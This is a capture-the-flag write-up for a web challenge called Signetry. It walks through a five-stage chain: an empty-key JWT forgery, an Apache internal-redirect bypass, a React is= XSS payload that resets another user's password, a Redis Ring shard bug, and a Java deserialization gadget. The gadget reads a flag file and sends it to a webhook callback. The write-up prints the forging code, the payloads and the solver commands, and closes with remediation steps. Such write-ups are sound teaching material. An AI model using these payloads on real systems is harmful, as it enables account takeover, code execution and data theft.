# Signetry - End-to-End Writeup
**Author:** Mohammed Ali  
**Difficulty:** Medium 
**Category:** Web 

Target used during testing:



The challenge is a five-stage chain. Each bug supplies the privilege or
capability needed by the next stage:

| Stage | Bug | Result |
| --- | --- | --- |
| 1 | qor/auth uses an empty JWT signing key | Become the maintainer |
| 2 | Apache type-map internal redirect bypass | Queue `wardenbot` |
| 3 | React `is=` custom-element XSS | Become the curator |
| 4 | go-redis Ring multi-key `DEL` bug | Bypass model review |
| 5 | Unfiltered Java deserialization in DL4J | Execute code as `registry` |

The supplied `exploit/model.zip` already contains a valid DL4J model and the
serialized Java gadget. The gadget's `Evil.class` reads `/flag.txt`, Base64URL
encodes it, and sends it to the webhook token used by the solver.

## 1. Application layout

The public service is Apache on port 1337. Apache proxies normal requests to
the Go gateway on `127.0.0.1:8090`. The gateway forwards model certification to
the Java registry on `127.0.0.1:1338`.

```text
client -> Apache -> Go gateway -> Java registry
                 |       |
                 |       +-- Redis Ring: 6379 and 6380
                 +---------- wardenbot polls /internal/queue
```

Important accounts are seeded at startup:

```text
dms@htb.com          maintainer
warden@htb.com       service; reviewer and credential reissue
conservator@htb.com  curator; reviewer and model finalization
```

The maintainer and curator passwords are random at startup. The warden
password is also random, so the intended route is to change the curator's
password through the browser bot rather than guess any secret.

## 2. Empty-key JWT forgery

`internal/auth/authenticator.go` creates qor/auth with only a database:

```go
qor := qorauth.New(&qorauth.Config{DB: gormDB})
```

The default session storer is then created with an empty `SignedString`. Token
validation therefore verifies HS256 with `[]byte("")`.

The password reset handler accepts a validated JWT and uses its `jti` claim as
the account ID. It does restrict the account to the maintainer, but that is
exactly the account needed for the next stages.

The solver creates this token:

```python
now = int(time.time())
header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}))
payload = b64url(json.dumps({
    "jti": "dms@htb.com",
    "iat": now,
    "nbf": now - 60,
    "exp": now + 3600,
    "provider": "password",
}))
message = f"{header}.{payload}".encode()
signature = hmac.new(b"", message, hashlib.sha256).digest()
token = f"{message.decode()}.{b64url(signature)}"
```

It is submitted to:

```http
POST /auth/password/update
Content-Type: application/json

{"reset_password_token":"<forged JWT>","new_password":"pwned123"}
```

The solver then logs in as `dms@htb.com` and keeps that cookie jar separate
from the future curator cookie jar.

## 3. Apache type-map redirect and bot dispatch

The internal endpoint is intended to be loopback-only:

```go
ip := net.ParseIP(c.RemoteIP())
if ip == nil || !ip.IsLoopback() { ... }
```

However, Apache is the direct peer of the Go gateway, so every proxied request
has a remote address of `127.0.0.1`. The check therefore accepts requests
that originated externally through Apache.

Apache adds a second restriction:

```apache
RewriteCond %{IS_SUBREQ} =false
RewriteCond %{ENV:REDIRECT_STATUS} =""
RewriteRule ^/internal(/|$) - [F]
```

Both conditions must be true. An internal redirect makes `REDIRECT_STATUS`
non-empty, so the rule no longer matches.

Maintainers can write an attachment into `/var/www/uploads`, which is served
with `mod_negotiation`'s type-map handler. The uploaded file is:

```text
URI: ../internal/dispatch
Content-Type: text/plain

```

Requesting `/uploads/<file>.var` makes Apache internally redirect from
`/uploads/` to `/internal/dispatch`. The dispatch handler queues `/admin` for
the bot and returns `202`.

Exactly one `..` is required. `../internal/dispatch` normalizes to
`/internal/dispatch`; an absolute `URI: /internal/dispatch` stays below the
`/uploads` alias and gives a 404, while multiple parent traversals are
rejected by Apache.

## 4. React `is=` XSS and curator takeover

Appeal bodies are parsed as HTML by `html-react-parser`. The replacement
filter checks only element names and does not validate attributes. Although
the blocked-element list includes `script`, it does not include `img`.

The obvious payload fails:

```html
<img src=x onerror="..."><!-- React drops string on* attributes -->
```

React's DOM code ignores string `on*` attributes on ordinary elements. Its
custom-element decision has a useful exception: for a tag without a hyphen,
an `is` prop containing a string makes the element custom-component-like. In
that mode React writes the attributes directly, including `onerror`.

The payload used by the solver is equivalent to:

```html
<img is="x" src="y"
 onerror="fetch('/admin/credential/reset',{
   method:'POST',
   headers:{'Content-Type':'application/json'},
   body:JSON.stringify({
     uid:'conservator@htb.com',
     new_password:'curator123'
   })
 })">
```

The CSP contains `script-src-attr 'unsafe-inline'`, so the inline event
handler is allowed. The fetch is same-origin because wardenbot blocks
cross-origin requests through Chrome DevTools Fetch interception.

When the bot visits `/admin`, the appeal is rendered and the broken image
fires `onerror`. Warden has `credential:reissue`, and the server allows that
role to change a target with the curator role. The solver can then log in as
`conservator@htb.com` with the chosen password.

## 5. Redis Ring shard bug

Staging writes three independent keys:

```text
model:blob:<token>
model:unsealed:<token>
model:intake:<token>
```

The vulnerable withdraw operation sends all three keys in one Ring command:

```go
return d.ring.Del(ctx,
    "model:unsealed:"+token,
    "model:intake:"+token,
    "model:blob:"+token,
).Result()
```

`go-redis` chooses a shard from the first key and sends the entire `DEL`
there. The other keys are not deleted if they belong to the other shard.

For a useful split, the first two keys must be on the same shard and the blob
must be on the other shard:

```text
unsealed: deleted
intake:   deleted
blob:     survives
```

With two shards this is approximately a 1/4 event. The solver stages a fresh
model and withdraws it repeatedly until this happens.

`GET /api/versions/<token>` exposes only whether the blob and unsealed marker
exist. Therefore it may report `approved` even though the intake marker still
exists. In that case `/finalize` correctly returns `403 model is not sealed`.
That token cannot be repaired; the solver simply obtains another token.

This avoids `/seal` entirely. Consequently `review.Review`, including its
checks for `preprocessor.bin`, is never called.

## 6. DL4J deserialization gadget

After a successful `/finalize`, the Go gateway sends the surviving blob to the
Java registry. The validator checks that the archive contains valid
`configuration.json` and `coefficients.bin`, but does not inspect
`preprocessor.bin`.

The later DL4J restore path contains:

```java
byte[] prep = zipFile.get("preprocessor.bin");
ObjectInputStream ois = new ObjectInputStream(
    new ByteArrayInputStream(prep));
preProcessor = (DataSetPreProcessor) ois.readObject();
```

There is no `ObjectInputFilter`.

The prepared serialized object uses this chain:

```text
BadAttributeValueExpException.val
  -> shaded Jackson POJONode._value
  -> TemplatesImpl
  -> Evil.class static initializer
```

The Jackson classes are shaded under `org.nd4j.shade.jackson.*`, so the local
shim classes in `exploit/org/` reproduce the serialized class descriptors
without triggering Jackson's normal `writeReplace` behavior during payload
generation.

`Evil.class` runs as the `registry` user. It reads `/flag.txt`, adds the Java
user name for diagnostics, Base64URL encodes the result, and sends it as the
`f` query parameter to the callback URL.

The model archive must contain:

```text
configuration.json
coefficients.bin
preprocessor.bin
```

The supplied `exploit/model.zip` is already assembled and was accepted by the
target.

## 7. Running the solver

From this directory:

```powershell
python .\solve_signetry.py `
  --target http://154.57.164.76:30394 `
  --model .\exploit\model.zip `
  --callback-token 8f1afc30-aad6-4fe9-aefd-5825ed5abdc1
```

The solver performs all of these actions:

1. Forge the empty-key JWT and reset the maintainer password.
2. Log in as the maintainer.
3. Upload the Apache type-map attachment.
4. Submit the `is=` XSS appeal.
5. Trigger the internal dispatch and wait for wardenbot.
6. Log in as the curator.
7. Stage and withdraw models until the Redis shard condition is met.
8. Finalize the surviving model.
9. Poll webhook.site and decode the flag callback.

If the model payload uses a different callback, pass its webhook token with
`--callback-token`. Use `--callback-token ""` to stop after model acceptance.
Increase `--max-attempts` if the random shard split is unlucky, or
`--review-wait` if the bot is slow:

```powershell
python .\solve_signetry.py --target http://HOST:PORT `
  --max-attempts 100 --review-wait 45
```

A `403` finalization during an early retry is expected when the intake marker
survived. The solver treats it as a failed shard attempt and continues.

## 8. Result

The callback received from the target decoded to:

```text
HTB{the_se4l_certifies_canon_n0t_contraband_7700f8b75debf9aee003218359834a95}
```

The process executed inside the registry JVM as the unprivileged `registry`
user; `/flag.txt` was readable because the challenge image sets it to mode
`0444`.

## 9. Remediation

The chain is fixed by addressing each independent issue:

1. Give qor/auth a strong non-empty signing secret, or use one-time database
   reset tokens with expiry.
2. Protect internal routes at a separate listener or use a correctly trusted
   client-IP check. Do not allow user-controlled type-maps in an aliased
   directory.
3. Render appeals as text or sanitize tags and attributes with an allowlist;
   remove `script-src-attr 'unsafe-inline'`.
4. Delete Ring keys separately or use a shared hash tag, and track an explicit
   sealed state instead of inferring it from marker absence.
5. Reject `preprocessor.bin` or install a strict Java serialization filter;
   deserialize untrusted models in an isolated process.

   ### About the Author

Mohammed Ali Cybersecurity student focused on penetration testing and Digital Forensics.
accounts on insta

Instagram : https://www.instagram.com/e6ecx/
THM : https://tryhackme.com/p/eng.mohammed.ali.abd

Follow My Journey
I regularly share write-ups and my cybersecurity journey. More content coming soon
